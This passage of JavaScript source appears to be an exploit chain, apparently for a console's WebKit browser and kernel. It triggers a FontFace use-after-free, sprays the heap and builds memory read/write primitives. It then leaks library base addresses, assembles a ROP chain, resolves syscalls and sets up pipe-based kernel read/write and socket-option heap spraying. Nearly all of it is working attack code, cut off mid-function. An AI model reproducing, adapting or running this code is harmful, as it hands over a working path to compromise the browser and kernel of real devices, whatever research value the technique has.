  if (len === 0) return "";

  const u8 = new Uint8Array(len);

  mem.copy(u8.buffer.data(), addr, len);

  return new TextDecoder().decode(u8);
};

ArrayBuffer.from = function (addr, len = -1) {
  if (addr.eq(0)) {
    throw new RangeError("Empty addr !!");
  }

  const ab = mem.alloc(0, false);
  const ab_addr = arw.addrof(ab);

  let m_impl = arw.view(ab_addr).getBInt(0x10, true);

  if (version.major === 6) {
    m_impl = m_impl.xor(g_JSArrayBufferPoison);
  }

  const m_data = arw.view(m_impl).getBInt(0x10, true);

  ab.m_data = m_data;

  arw.view(m_impl).setBInt(0, 2, true); // DeferrableRefCountedBase::m_refCount
  arw.view(m_impl).setBInt(constants.wk_ArrayBuffer_m_contents_m_data, addr, true); // m_contents.m_data

  // m_contents.m_sizeInBytes
  if (version.major === 9) {
    arw.view(m_impl).setInt32(constants.wk_ArrayBuffer_m_contents_m_sizeInBytes, len, true);
  } else {
    arw.view(m_impl).setBInt(constants.wk_ArrayBuffer_m_contents_m_sizeInBytes, len, true);
  }

  return ab;
};
//#endregion
//#region Functions
function errno() {
  if (!fn.hasOwnProperty("_error")) {
    throw new Error("_error undefined !!");
  }

  return arw.view(fn._error.invoke()).getUint32(0, true);
}

function strerror() {
  if (!fn.hasOwnProperty("_strerror")) {
    throw new Error("strerror undefined !!");
  }

  return fn._strerror.invoke(errno());
}

function sleep(ms = 0) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function nsleep(nsec) {
  const time = timespec.new();

  time.tv_sec = Math.floor(nsec / 1e9);
  time.tv_nsec = nsec % 1e9;

  if (fn.nanosleep.invoke(time.addr) === -1) {
    throw new SyscallError(`Unable to sleep for ${nsec} nano seconds !!`);
  }

  mem.free(time.addr);
}

async function init_rw() {
  logger.info("Initiate UAF...");

  const spray_count = 0xb0;
  const spray_font_rule = `
    @font-face {
      font-family: spray;
      src: local(Helvetica Bold);
      unicode-range: U+0043;
    }
  `;
  const uaf_font_rule = `
    @font-face {
      font-family: b;
      src: url(nonexistent-font.woff);
      unicode-range: U+0042;
    }
  `;

  const abs = new Array(spray_count);

  // FontFace A with a local source so it resolves synchronously
  const A = new FontFace("a", "local(Helvetica)", { unicodeRange: "U+0041" });

  document.fonts.add(A);

  // Register a DeferredPromise on A
  void A.loaded;

  const style = document.createElement("style");
  document.head.appendChild(style);

  // Shape heap around B in order to reclaim it after free
  for (let i = 0; i < spray_count / 4; i++) {
    style.sheet.insertRule(spray_font_rule, style.sheet.cssRules.length);
  }

  // FontFace B with a remote source so it resolves asynchronously
  const uaf_font_rule_index = style.sheet.cssRules.length;
  style.sheet.insertRule(uaf_font_rule, style.sheet.cssRules.length);

  // Shape heap around B in order to reclaim it after free
  for (let i = spray_count / 4; i < spray_count; i++) {
    style.sheet.insertRule(spray_font_rule, style.sheet.cssRules.length);
  }

  // Forces style recalculation and FontFace instantiation
  document.body.offsetTop;

  const old_then = FontFace.prototype.then;

  Object.defineProperty(FontFace.prototype, "then", {
    configurable: true,
    get() {
      if (this === A) {
        // Free B while FontFaceSet::load still holds a raw reference to it in matchingFaces
        style.sheet.deleteRule(uaf_font_rule_index);

        // Forces style recalculation and FontFace deconstruction
        document.body.offsetTop;

        // Free B's neighbours
        for (let i = style.sheet.cssRules.length - 1; i >= 0; i--) {
          const rule = style.sheet.cssRules[i];

          if (rule.cssText.includes("spray")) {
            style.sheet.deleteRule(i);
          }
        }

        // Forces style recalculation and FontFace deconstruction
        document.body.offsetTop;

        // Spray ArrayBuffer with FontFace size and populate it so it survives crash
        for (let i = 0; i < abs.length; i++) {
          const ab = new ArrayBuffer(constants.wk_CSSFontFace_sizeof);
          const view = new DataView(ab);

          view.setBInt(8, 1, true); // ref count
          view.setUint8(constants.wk_CSSFontFace_m_status, 3); // m_status: Status::Success

          abs[i] = ab;
        }
      }

      return undefined;
    },
  });

  // Loading 'AB' needs both U+0041 (from A) and U+0042 (from the CSS rule)
  // A resolves synchronously, firing the thenable check getter above
  const fonts = await document.fonts.load("1em a, b", "AB");

  logger.debug(`fonts: ${fonts}`);

  Object.defineProperty(FontFace.prototype, "then", {
    configurable: true,
    value: old_then,
  });

  // Check if both A and B are loaded
  if (fonts.length !== 2) {
    throw new Error("Unable to reclaim UAF FontFace !!");
  }

  logger.info("UAF Achieved !!");

  let uaf_ab = undefined;
  let uaf_font = undefined;

  // UAF FontFace has default unicodeRange value U+0-10FFFF
  for (const font of fonts) {
    if (font.unicodeRange === "U+0-10FFFF") {
      logger.info("Found UAF FontFace !!");
      uaf_font = font;
      break;
    }
  }

  if (uaf_font === undefined) {
    throw new Error("Unable to find UAF error !!");
  }

  fonts.length = 0;

  // UAF ArrayBuffer has ref count of 2 due to FontFace return to script
  for (const ab of abs) {
    const view = new DataView(ab);
    if (view.getBInt(8, true).eq(2)) {
      logger.info("Found ArrayBuffer of UAF FontFace !!");
      uaf_ab = ab;
      break;
    }
  }

  if (uaf_ab === undefined) {
    throw new Error("Unable to find ArrayBuffer of UAF FontFace !!");
  }

  abs.length = 0;

  return {
    uaf_ab: uaf_ab,
    uaf_font: uaf_font,
    leak: { obj: 0 },
    leak_addr: undefined,
    read(addr, size) {
      const ab = new ArrayBuffer(size);
      const u8 = new Uint8Array(ab);

      const uaf_view = new DataView(this.uaf_ab);

      let offset = 0;
      while (offset < size) {
        const ptr = addr.add(offset);

        uaf_view.setBInt(constants.wk_CSSFontFace_m_featureSettings_m_buffer, ptr, true); // m_featureSettings.m_buffer
        uaf_view.setInt32(constants.wk_CSSFontFace_m_featureSettings_m_size, 1, true); // m_featureSettings.m_size
        uaf_view.setInt32(constants.wk_CSSFontFace_m_featureSettings_m_capacity, 1, true); // m_featureSettings.m_capacity

        // read m_tag since its std::array<char, 4> and skip the " chars
        for (let i = 1; i < 5; i++) {
          u8[offset++] = this.uaf_font.featureSettings.charCodeAt(i);
        }
      }

      return ab;
    },
    read8(addr) {
      const ab = this.read(addr, 8);
      const view = new DataView(ab);
      return view.getBInt(0, true);
    },
    addrof(obj) {
      this.leak.obj = obj;
      return this.read8(this.leak_addr.add(0x10));
    },
  };
}

async function init_arw(rw) {
  logger.info("Initiate ARW...");

  if (rw !== undefined) {
    // setup arw using rw
    const uaf_view = new DataView(rw.uaf_ab);

    const m_clients = uaf_view.getBInt(constants.wk_CSSFontFace_m_clients, true);
    const m_wrapper = uaf_view.getBInt(constants.wk_CSSFontFace_m_wrapper, true);

    logger.debug(`m_clients: ${m_clients}`);
    logger.debug(`m_wrapper: ${m_wrapper}`);

    const m_wrapper_m_ptr = rw.read8(m_wrapper.add(8));
    logger.debug(`m_wrapper_m_ptr: ${m_wrapper_m_ptr}`);

    const m_backing = rw.read8(m_wrapper_m_ptr.add(constants.wk_FontFace_m_backing));
    logger.debug(`m_backing: ${m_backing}`);

    const props = [];
    const marker = 0x41414141;

    // Spray marker and target JS object as props
    for (let i = 0; i < 0x100; i++) {
      props.push({ value: marker });
      props.push({ value: rw.leak });
    }

    let found = false;
    let start = m_backing.alignUp(0x4000);

    while (true) {
      // Allocates Vector<PropertyDescriptor> and MarkedArgumentBuffer, both of which uses fastMalloc which will spray our props into fastMalloc heap
      Object.defineProperties({}, props);

      const dv = new DataView(rw.read(start, 0x100));

      for (let i = 0; i < dv.byteLength / 8; i += 8) {
        if (dv.getUint32(i, true) === marker && dv.getUint32(i + 0x18, true) === 0xe) {
          const marker_addr = start.add(i);
          logger.info(`Found Array marker at ${marker_addr} !!`);

          rw.leak_addr = rw.read8(marker_addr.add(0x20));
          logger.debug(`rw_leak_addr: ${rw.leak_addr}`);

          found = true;
          break;
        }
      }

      if (found) {
        break;
      }

      start = start.add(0x100);
    }

    const rw_leak_obj_addr = rw.leak_addr.add(0x10);
    logger.debug(`rw_leak_obj_addr: ${rw_leak_obj_addr}`);

    arw.leak_addr = rw.addrof(arw.leak);
    logger.debug(`arw_leak_addr: ${arw.leak_addr}`);

    const dummy_view = new Uint32Array(1);
    const dummy_view_addr = rw.addrof(dummy_view);
    logger.debug(`dummy_view_addr: ${dummy_view_addr}`);

    const dummy_view_jscell = rw.read8(dummy_view_addr);
    logger.debug(`dummy_view_jscell: ${dummy_view_jscell}`);

    // Prepare container's properties to be used with fakeobj to create arw.master view over arw.victim DataView
    const container = {
      jscell: dummy_view_jscell.d, // NaN-boxed, fix later
      butterfly: null, // becomes 0x2, fix later
      vector: arw.victim,
    };

    if (version.major >= 10) {
      container.length = false; // becomes 0x6, fix later
      container.flags = null; // becomes 0x2, fix later
    } else {
      container.length_and_flags = false; // becomes 0x6, fix later
    }

    const container_addr = rw.addrof(container);
    logger.debug(`container_addr: ${container_addr}`);

    const fake_addr = container_addr.add(0x10);
    logger.debug(`fake_addr: ${fake_addr}`);

    const dummy_font = new FontFace("spray", "local(Helvetica)", {});
    const dummy_font_addr = rw.addrof(dummy_font);
    logger.debug(`dummy_font_addr: ${dummy_font_addr}`);

    const font_addr = rw.read8(dummy_font_addr.add(0x18));
    logger.debug(`font_addr: ${font_addr}`);

    const css_font_addr = rw.read8(font_addr.add(constants.wk_FontFace_m_backing));
    logger.debug(`css_font_addr: ${css_font_addr}`);

    const css_font_vtable = rw.read8(css_font_addr);
    logger.debug(`css_font_vtable: ${css_font_vtable}`);

    const m_thread = rw.read8(css_font_addr.add(constants.wk_CSSFontFace_m_thread));
    logger.debug(`m_thread: ${m_thread}`);

    webkit_base = css_font_vtable.sub(constants.wk_CSSFontFace_vtable);
    logger.info(`webkit_base: ${webkit_base}`);

    // Craft a fake vtable to perform a fakeobj write of fake_addr to rw.leak.obj
    const fake_obj = new DataView(new ArrayBuffer(0x20));
    const fake_vtable = new DataView(new ArrayBuffer(0x10));

    const fake_obj_addr = rw.addrof(fake_obj);
    const fake_vtable_addr = rw.addrof(fake_vtable);

    const fake_obj_m_vector = rw.read8(fake_obj_addr.add(0x10));
    const fake_vtable_m_vector = rw.read8(fake_vtable_addr.add(0x10));

    let fake_vtable_gadget;
    let dst_addr_offset;

    if (version.major >= 10) {
      fake_vtable_gadget = gadgets.MOV_RAX_QWORD_PTR_RDI_8_MOV_RCX_QWORD_PTR_RDI_10_MOV_QWORD_PTR_RCX_2060_RAX_RET;
      dst_addr_offset = 0x2060;
    } else if (version.major >= 9) {
      fake_vtable_gadget = gadgets.MOV_RAX_QWORD_PTR_RDI_8_MOV_RCX_QWORD_PTR_RDI_10_MOV_QWORD_PTR_RCX_2330_RAX_RET;
      dst_addr_offset = 0x2330;
    } else if (version.major >= 7) {
      fake_vtable_gadget = gadgets.MOV_RAX_QWORD_PTR_RDI_8_MOV_RCX_QWORD_PTR_RDI_10_MOV_QWORD_PTR_RCX_21d8_RAX_RET;
      dst_addr_offset = 0x21d8;
    } else if (version.major >= 6) {
      fake_vtable_gadget = gadgets.MOV_RAX_QWORD_PTR_RDI_8_MOV_RCX_QWORD_PTR_RDI_10_MOV_QWORD_PTR_RCX_2238_RAX_RET;
      dst_addr_offset = 0x2238;
    }

    fake_vtable.setBInt(8, fake_vtable_gadget, true);

    fake_obj.setBInt(0, fake_vtable_m_vector, true);
    fake_obj.setBInt(8, fake_addr, true);
    fake_obj.setBInt(0x10, rw_leak_obj_addr.sub(dst_addr_offset), true);

    // Needed to survive crash from calling CSSFontFaceSet::add/CSSFontFaceSet::remove
    uaf_view.setUint8(constants.wk_CSSFontFace_m_status, 4); // m_status: Status::Failure

    document.fonts.add(rw.uaf_font);

    // Prepare UAF FontFace to be freed on CSSFontFaceSet::remove call and execute our fake vtable
    new Uint8Array(uaf_view.buffer).fill(0);

    uaf_view.setBInt(0, css_font_vtable, true); // valid vtable
    uaf_view.setBInt(8, 1, true); // ref count
    uaf_view.setBInt(constants.wk_CSSFontFace_m_clients, m_clients, true); // m_clients
    uaf_view.setBInt(constants.wk_CSSFontFace_m_wrapper, m_wrapper, true); // m_wrapper
    uaf_view.setUint8(constants.wk_CSSFontFace_m_status, 4); // m_status: Status::Failure
    uaf_view.setBInt(constants.wk_CSSFontFace_m_thread, m_thread, true); // m_thread
    uaf_view.setBInt(constants.wk_CSSFontFace_m_function, fake_obj_m_vector, true); // m_function

    document.fonts.delete(rw.uaf_font);

    // Cleanup UAF
    new Uint8Array(uaf_view.buffer).fill(0);

    // Return crafted fakeobj from container to script
    const fake = rw.leak.obj;

    // Set victim's vector to fake_addr
    fake[4] = fake_addr.lo;
    fake[5] = fake_addr.hi;

    // Fix NaN-boxing values from earlier
    arw.victim.setBInt(0, dummy_view_jscell, true); // jscell
    arw.victim.setBInt(8, 0, true); // butterfly

    // TypedArrayMode::OversizeTypedArray
    if (version.major >= 10) {
      arw.victim.setBInt(constants.wk_TypedArray_flags, 1, true);
    } else {
      arw.victim.setUint32(constants.wk_TypedArray_flags, 1, true);
    }

    // Create new view as TypedArrayMode::WastefulTypedArray using fake.buffer that points to arw.victim and no longer depends on container's lifetime
    arw.master = new Uint32Array(fake.buffer);
  }

  const victim_addr = arw.addrof(arw.victim);
  logger.debug(`victim_addr: ${victim_addr}`);

  // Set arw.victim's length to max
  if (version.major >= 10) {
    arw.view(victim_addr).setBInt(0x18, -1, true);
  } else {
    arw.view(victim_addr).setInt32(0x18, -1, true);
  }

  if (version.major === 6) {
    g_JSArrayBufferPoison = arw.view(webkit_base).getBInt(constants.wk_g_JSArrayBufferPoison, true);
    g_JSFunctionPoison = arw.view(webkit_base).getBInt(constants.wk_g_JSFunctionPoison, true);
    g_NativeCodePoison = arw.view(webkit_base).getBInt(constants.wk_g_NativeCodePoison, true);
  }

  logger.info("Achieved ARW !!");
}

function init_rop() {
  logger.info("Initiate ROP...");

  const math_expm1_addr = arw.addrof(Math.expm1);
  logger.debug(`math_expm1_addr: ${math_expm1_addr}`);

  let m_executableOrRareData = arw.view(math_expm1_addr).getBInt(0x18, true);

  if (version.major === 6) {
    m_executableOrRareData = m_executableOrRareData.xor(g_JSFunctionPoison);
  }

  logger.debug(`m_executableOrRareData: ${m_executableOrRareData}`);

  logger.info(`webkit base: ${webkit_base}`);

  strerror_addr = arw.view(webkit_base).getBInt(constants.wk___imp_strerror, true);
  logger.debug(`strerror_addr: ${strerror_addr}`);

  libc_base = strerror_addr.sub(constants.c_strerror);
  logger.info(`libc base: ${libc_base}`);

  _error_addr = arw.view(webkit_base).getBInt(constants.wk___imp___error, true);
  logger.debug(`_error_addr: ${_error_addr}`);

  libkernel_base = _error_addr.sub(constants.k__error);
  logger.info(`libkernel base: ${libkernel_base}`);

  let m_function_pivot;

  if (version.major === 6) {
    m_function_pivot = g_NativeCodePoison.xor(gadgets.MOV_RDI_RDI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_120);
  } else if (version.major < 9) {
    m_function_pivot = gadgets.MOV_RDI_RDI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_40;
  } else {
    m_function_pivot = gadgets.MOV_RDI_RSI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX;
  }

  arw.view(m_executableOrRareData).setBInt(constants.wk_JSFunction_m_function, m_function_pivot, true);

  rop.pivot = new Pivot();
  rop.stack = new Stack(0x2000);
  rop.frame = new Frame(["jmp_rax", "rsp", "rax", "rip", "rdi", "rsi", "rdx", "rcx", "r8", "r9"]);

  rop.insts.push(gadgets.POP_RAX_RET);
  rop.insts.push(rop.frame.addrof("jmp_rax"));
  rop.insts.push(gadgets.PUSH_RBP_JMP_QWORD_PTR_RAX);

  rop.frame.store(rop.insts, "rsp");

  rop.insts.push(gadgets.POP_RAX_RET);
  rop.frame.valueof(rop.insts, "rax");

  rop.insts.push(gadgets.POP_RDI_RET);
  rop.frame.valueof(rop.insts, "rdi");

  rop.insts.push(gadgets.POP_RSI_RET);
  rop.frame.valueof(rop.insts, "rsi");

  rop.insts.push(gadgets.POP_RDX_RET);
  rop.frame.valueof(rop.insts, "rdx");

  rop.insts.push(gadgets.POP_RCX_RET);
  rop.frame.valueof(rop.insts, "rcx");

  rop.insts.push(gadgets.POP_R8_RET);
  rop.frame.valueof(rop.insts, "r8");

  rop.insts.push(gadgets.POP_R9_RET);
  rop.frame.valueof(rop.insts, "r9");

  rop.frame.valueof(rop.insts, "rip");

  rop.frame.store(rop.insts, "rax");

  rop.frame.load(rop.insts, "rsp");
  rop.insts.push(gadgets.PUSH_RAX_POP_RBP_RET);
  rop.insts.push(gadgets.POP_RAX_RET);
  rop.insts.push(0);
  rop.insts.push(gadgets.LEAVE_RET);

  fn._error = new NativeFunction(_error_addr, "bint");
  fn._strerror = new NativeFunction(strerror_addr, "string");

  logger.info("Achieved ROP !!");
}

function init_syscalls() {
  logger.info("Initiate SYSCALLS...");

  scan_syscalls(libkernel_base);

  // syscall functions
  fn.read = new NativeFunction(0x3, "bint");
  fn.write = new NativeFunction(0x4, "bint");
  fn.open = new NativeFunction(0x5, "number");
  fn.close = new NativeFunction(0x6, "number");
  fn.fstat = new NativeFunction(0xbd, "number");
  fn.sysctl = new NativeFunction(0xca, "number");
  fn.nanosleep = new NativeFunction(0xf0, "number");
  fn.socket = new NativeFunction(0x61, "number");
  fn.dlsym = new NativeFunction(0x24f, "number");
  fn.dup = new NativeFunction(0x29, "number");
  fn.getpid = new NativeFunction(0x14, "number");

  logger.info("Initiated SYSCALLS !!");
}

function scan_syscalls(base) {
  if (syscalls.size > 0) {
    logger.info(`Already found ${syscalls.size} syscalls !!`);
    return;
  }

  const size = 0x40000;
  const pattern = [0x48, 0xc7, 0xc0, 0xff, 0xff, 0xff, 0xff, 0x49, 0x89, 0xca, 0x0f, 0x05];
  const pattern_end = pattern.length - 1;

  const u8 = new Uint8Array(ArrayBuffer.from(base, size));

  let i = 0;
  let match = 0;
  let offset = 0;
  while (offset < size) {
    const b = u8[offset];
    const c = pattern[i];

    if (b === c || c === 0xff) {
      if (i === 0) {
        match = offset;
      }

      i++;

      if (i === pattern_end) {
        const addr = base.add(match);
        const id = arw.view(addr).getInt32(3, true);

        syscalls.set(id, addr);

        i = 0;
      }
    } else {
      i = 0;
    }

    offset++;
  }

  logger.info(`Found ${syscalls.size} syscalls !!`);
}
//#endregion
//#region Structs
const timespec = new Struct("timespec", [
  { type: "Int64", name: "tv_sec" },
  { type: "Int64", name: "tv_nsec" },
]);
//#endregion

//#region Constants
const KERNEL_PID = 0;

const PAGE_SIZE = 0x4000;

const SYSCORE_AUTHID = new BInt("0x4800000000000007");

const FIOSETOWN = 0x8004667c;

const F_SETFL = 4;

const O_NONBLOCK = 4;

const AF_UNIX = 1;
const AF_INET = 2;
const AF_INET6 = 28;
const SOCK_STREAM = 1;
const SOCK_DGRAM = 2;
const SOL_SOCKET = 0xffff;
const SO_REUSEADDR = 4;
const SO_LINGER = 0x80;
const SO_SNDBUF = 0x1001;

const IPPROTO_TCP = 6;
const IPPROTO_IPV6 = 41;

const TCP_INFO = 32;
const TCPS_ESTABLISHED = 4;

const IPV6_2292PKTOPTIONS = 25;
const IPV6_PKTINFO = 46;
const IPV6_NEXTHOP = 48;
const IPV6_RTHDR = 51;
const IPV6_TCLASS = 61;

const RTP = 0x100;
const RTP_SET = 1;
const MAIN_CORE = 7;
const CPU_WHICH_TID = 1;
const CPU_LEVEL_WHICH = 3;
const RTP_PRIO_REALTIME = 2;

const UCRED_SIZE = 0x168;
const KQUEUE_SIZE = 0x100;
const TCP_INFO_SIZE = 0xec;
const FILEDESCENT_SIZE = 8;

const master_pipe = new Array(2);
const slave_pipe = new Array(2);

let spray_rthdr0_len = undefined;
let spray_rthdr0_addr = undefined;
let leak_rthdr0_addr = undefined;

let kernel_base = undefined;
let fdt_ofiles = undefined;
let allproc = undefined;

let kv = undefined;

// deferred: init_kernel_fns()
//#endregion
function init_kernel_fns() {
  fn.setuid = new NativeFunction(0x17, "number");
  fn.pipe = new NativeFunction(0x2a, "number");
  fn.ioctl = new NativeFunction(0x36, "number");
  fn.fcntl = new NativeFunction(0x5c, "number");
  fn.socket = new NativeFunction(0x61, "number");
  fn.setsockopt = new NativeFunction(0x69, "number");
  fn.getsockopt = new NativeFunction(0x76, "number");
  fn.sched_yield = new NativeFunction(0x14b, "number");
  fn.rtprio_thread = new NativeFunction(0x1d2, "number");
  fn.cpuset_setaffinity = new NativeFunction(0x1e8, "number");
  fn.kexec = new NativeFunction(0x295, "number");
}
//#region Classes
class KernelView {
  constructor(master_pipe, slave_pipe) {
    if (!Array.isArray(master_pipe) || master_pipe.length !== 2) {
      throw new Error("pipe should have 2 fds for r/w");
    }

    if (!Array.isArray(slave_pipe) || slave_pipe.length !== 2) {
      throw new Error("pipe should have 2 fds for r/w");
    }

    this.view = new DataView(new ArrayBuffer(8));
    this.master_pipe = master_pipe.slice();
    this.slave_pipe = slave_pipe.slice();

    if (fn.fcntl.invoke(this.master_pipe[0], F_SETFL, O_NONBLOCK) === -1) {
      throw new SyscallError(`Unable to fcntl fd ${this.master_pipe[0]}`);
    }

    if (fn.fcntl.invoke(this.master_pipe[1], F_SETFL, O_NONBLOCK) === -1) {
      throw new SyscallError(`Unable to fcntl fd ${this.master_pipe[1]}`);
    }

    if (fn.fcntl.invoke(this.slave_pipe[0], F_SETFL, O_NONBLOCK) === -1) {
      throw new SyscallError(`Unable to fcntl fd ${this.slave_pipe[0]}`);
    }

    if (fn.fcntl.invoke(this.slave_pipe[1], F_SETFL, O_NONBLOCK) === -1) {
      throw new SyscallError(`Unable to fcntl fd ${this.slave_pipe[1]}`);
    }

    this.pipe_buf = pipebuf.new();
    this.pipe_buf.size = PAGE_SIZE;
  }

  free() {
    mem.free(this.pipe_buf.addr);
  }

  get dv_backing() {
    return this.view.buffer.data();
  }

  get pipe_backing() {
    return this.pipe_buf.buffer;
  }

  set pipe_backing(addr) {
    if (addr.eq(0)) {
      throw new Error("Empty addr !!");
    }

    this.pipe_buf.buffer = addr;
  }

  get pipe_count() {
    return this.pipe_buf.cnt;
  }

  set pipe_count(count) {
    if (count < 0 && count > 0xffffffff) {
      throw new RangeError(`count ${count} out of range !!`);
    }

    this.pipe_buf.cnt = count;
  }

  flush() {
    if (fn.write.invoke(this.master_pipe[1], this.pipe_buf.addr, pipebuf.sizeof).eq(-1)) {
      throw new SyscallError(`Unable to write to fd ${this.master_pipe[1]} !!`);
    }

    if (fn.read.invoke(this.master_pipe[0], this.pipe_buf.addr, pipebuf.sizeof).eq(-1)) {
      throw new SyscallError(`Unable to read from fd ${this.master_pipe[0]} !!`);
    }
  }

  kread(dst, src, size) {
    this.pipe_backing = src;
    this.pipe_count = size;
    this.flush();

    const n = fn.read.invoke(this.slave_pipe[0], dst, size);
    if (n.eq(-1)) {
      throw new SyscallError(`Unable to read from fd ${this.slave_pipe[0]} !!`);
    }

    return n;
  }

  kwrite(dst, src, size) {
    this.pipe_backing = dst;
    this.pipe_count = size;
    this.flush();

    const n = fn.write.invoke(this.slave_pipe[1], src, size);
    if (n.eq(-1)) {
      throw new SyscallError(`Unable to write to fd ${this.slave_pipe[1]} !!`);
    }

    return n;
  }

  getFloat32(byteOffset, littleEndian = false) {
    this.view.setBInt(0, 0, true);

    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 4);

    return this.view.getFloat32(0, littleEndian);
  }

  getFloat64(byteOffset, littleEndian = false) {
    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 8);

    return this.view.getFloat64(0, littleEndian);
  }

  getInt8(byteOffset) {
    this.view.setBInt(0, 0, true);

    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 1);

    return this.view.getInt8(0);
  }

  getInt16(byteOffset, littleEndian = false) {
    this.view.setBInt(0, 0, true);

    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 2);

    return this.view.getInt16(0, littleEndian);
  }

  getInt32(byteOffset, littleEndian = false) {
    this.view.setBInt(0, 0, true);

    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 4);

    return this.view.getInt32(0, littleEndian);
  }

  getUint8(byteOffset) {
    this.view.setBInt(0, 0, true);

    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 1);

    return this.view.getUint8(0);
  }

  getUint16(byteOffset, littleEndian = false) {
    this.view.setBInt(0, 0, true);

    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 2);

    return this.view.getUint16(0, littleEndian);
  }

  getUint32(byteOffset, littleEndian = false) {
    this.view.setBInt(0, 0, true);

    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 4);

    return this.view.getUint32(0, littleEndian);
  }

  getBInt(byteOffset, littleEndian = false) {
    this.kread(this.dv_backing, this.pipe_backing.add(byteOffset), 8);

    return this.view.getBInt(0, littleEndian);
  }

  setFloat32(byteOffset, value, littleEndian = false) {
    this.view.setBInt(0, 0, true);
    this.view.setFloat32(0, value, littleEndian);

    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 4);
  }

  setFloat64(byteOffset, value, littleEndian = false) {
    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 8);
  }

  setInt8(byteOffset, value) {
    this.view.setBInt(0, 0, true);
    this.view.setInt8(0, value);

    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 1);
  }

  setInt16(byteOffset, value, littleEndian = false) {
    this.view.setBInt(0, 0, true);
    this.view.setInt16(0, value, littleEndian);

    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 2);
  }

  setInt32(byteOffset, value, littleEndian = false) {
    this.view.setBInt(0, 0, true);
    this.view.setInt32(0, value, littleEndian);

    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 4);
  }

  setUint8(byteOffset, value) {
    this.view.setBInt(0, 0, true);
    this.view.setUint8(0, value);

    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 1);
  }

  setUint16(byteOffset, value, littleEndian = false) {
    this.view.setBInt(0, 0, true);
    this.view.setUint16(0, value, littleEndian);

    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 2);
  }

  setUint32(byteOffset, value, littleEndian = false) {
    this.view.setBInt(0, 0, true);
    this.view.setUint32(0, value, littleEndian);

    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 4);
  }

  setBInt(byteOffset, value, littleEndian = false) {
    this.view.setBInt(0, value, littleEndian);

    this.kwrite(this.pipe_backing.add(byteOffset), this.dv_backing, 8);
  }
}
//#endregion
//#region Functions
function pin_to_core(core) {
  const mask = cpuset.new();

  mask.bits0 = 1 << core;

  if (fn.cpuset_setaffinity.invoke(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, cpuset.sizeof, mask.addr) === -1) {
    throw new SyscallError(`Unable to setaffinity to core ${core}`);
  }

  mem.free(mask.addr);
}

function set_rtprio(value) {
  const prio = rtprio.new();

  prio.type = RTP_PRIO_REALTIME;
  prio.prio = value;

  if (fn.rtprio_thread.invoke(RTP_SET, 0, prio.addr) === -1) {
    throw new SyscallError(`Unable to set priority to ${value}`);
  }

  mem.free(prio.addr);
}

function build_rthdr(addr, size) {
  const rthdr0 = ip6_rthdr0.new(addr);

  const in6_count = Math.floor((size - ip6_rthdr0.sizeof) / in6_addr.sizeof);

  rthdr0.ip6r0_nxt = 0;
  rthdr0.ip6r0_len = in6_count * 2;
  rthdr0.ip6r0_type = 0;
  rthdr0.ip6r0_segleft = in6_count;

  return ip6_rthdr0.sizeof + in6_addr.sizeof * in6_count;
}

function get_rthdr(sock, size) {
  const leak_rthdr0_len_addr = mem.alloc(4);
  arw.view(leak_rthdr0_len_addr).setInt32(0, size, true);
  if (fn.getsockopt.invoke(sock, IPPROTO_IPV6, IPV6_RTHDR, leak_rthdr0_addr, leak_rthdr0_len_addr) === -1) {
    throw new SyscallError(`Unable to get socket option for fd ${sock} !!`);
  }

  const leak_rthdr0_len = arw.view(leak_rthdr0_len_addr).getInt32(0, true);

  mem.free(leak_rthdr0_len_addr);

  return leak_rthdr0_len;
}

function set_rthdr(sock) {
  if (fn.setsockopt.invoke(sock, IPPROTO_IPV6, IPV6_RTHDR, spray_rthdr0_addr, spray_rthdr0_len) === -1) {
    throw new SyscallError(`Unable to set socket option for fd ${sock} !!`);
  }
}

function free_rthdr(sock) {
  if (fn.setsockopt.invoke(sock, IPPROTO_IPV6, IPV6_RTHDR, 0, 0) === -1) {
    throw new SyscallError(`Unable to set socket option for fd ${sock} !!`);
  }
}

function make_socket(domain, type, protocol = 0) {
  const sock = fn.socket.invoke(domain, type, protocol);
  if (sock === -1) {
    throw new SyscallError("Unable to create socket !!");
  }

  return sock;
}

function make_karw_pipe() {
  const pair_addr = mem.alloc(8);

  // Create karw pipe
  if (fn.pipe.invoke(pair_addr) === -1) {
    throw new SyscallError("Unable to create pipe !!");
  }

  master_pipe[0] = arw.view(pair_addr).getInt32(0, true);
  master_pipe[1] = arw.view(pair_addr).getInt32(4, true);

  if (fn.pipe.invoke(pair_addr) === -1) {
    throw new SyscallError("Unable to create pipe !!");
  }

  slave_pipe[0] = arw.view(pair_addr).getInt32(0, true);
  slave_pipe[1] = arw.view(pair_addr).getInt32(4, true);

  logger.debug(`master_pipe: ${master_pipe}`);
  logger.debug(`slave_pipe: ${slave_pipe}`);

  mem.free(pair_addr);
}

function free_karw_pipe() {
  if (typeof kv === "undefined") {
    for (const fd of master_pipe) {
      if (fd === 0) {
        continue;
      }

      if (fn.close.invoke(fd) === -1) {
        throw new SyscallError(`Unable to close fd ${fd} !!`);
      }
    }

    for (const fd of slave_pipe) {
      if (fd === 0) {
        continue;
      }

      if (fn.close.invoke(fd) === -1) {
        throw new SyscallError(`Unable to close fd ${fd} !!`);
      }
    }
  }
}

function kview(addr) {
  if (kv.pipe_backing !== addr) {
    kv.pipe_backing = addr;
  }

  return kv;
}

function fget(fd) {
  return kview(fdt_ofiles).getBInt(fd * FILEDESCENT_SIZE, true);
}

function fput(fd, fp) {
